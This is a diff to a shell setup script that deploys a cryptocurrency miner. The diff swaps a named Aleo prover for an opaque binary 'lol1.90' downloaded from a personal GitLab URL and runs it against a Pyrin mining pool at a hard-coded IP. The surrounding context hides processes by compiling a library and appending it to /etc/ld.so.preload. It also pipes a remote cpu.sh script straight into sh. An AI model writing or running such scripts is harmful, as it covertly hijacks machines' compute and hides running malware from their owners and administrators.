@@ -14,11 +14,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://github.com/6block/zkwork_aleo_gpu_worker/releases/download/v0.2.0/aleo_prover-v0.2.0.tar.gz
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.90
 
-tar -zvxf aleo_prover-v0.2.0.tar.gz && cd aleo_prover
-
-chmod 777 aleo_prover
+chmod 777 lol1.90
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -60,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./aleo_prover --pool 143.244.155.117:443 --address aleo1xq5qq6qrc55lkvpgquchf7jz4j2kt5f64c4llua7cnnpyxddy5zs2fjeuq --custom_name MJ & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./lol1.90 --algo PYRINV2 --pool 167.172.24.221:443 --user pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-3000)-Bismillah & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
